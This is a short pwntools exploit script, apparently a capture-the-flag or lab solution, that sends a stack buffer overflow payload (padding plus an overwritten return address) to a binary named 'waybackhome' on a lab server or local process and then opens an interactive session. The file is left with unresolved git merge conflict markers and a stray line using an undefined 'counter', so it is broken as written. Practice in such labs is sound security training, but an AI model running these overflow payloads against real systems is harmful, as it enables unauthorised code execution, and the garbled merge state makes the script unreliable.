from pwn import *

<<<<<<< HEAD
# r = process('/media/sf_D_DRIVE/waybackhome')
r = remote('lab.scist.org', 33361)

r.sendline((b'A') * 0x20 + (b'A') * 8 + p64(0x40117B))
r.interactive()
counter += 1
=======
r = process('/media/sf_D_DRIVE/waybackhome')
# r = remote('lab.scist.org', 33302)
r.sendline((b'A') * 0x20 + (b'A') * 8 + p64(0x401182))

r.interactive()
>>>>>>> 9b1b11c5bcdc4961e9289ef580e0bd006e2544a4
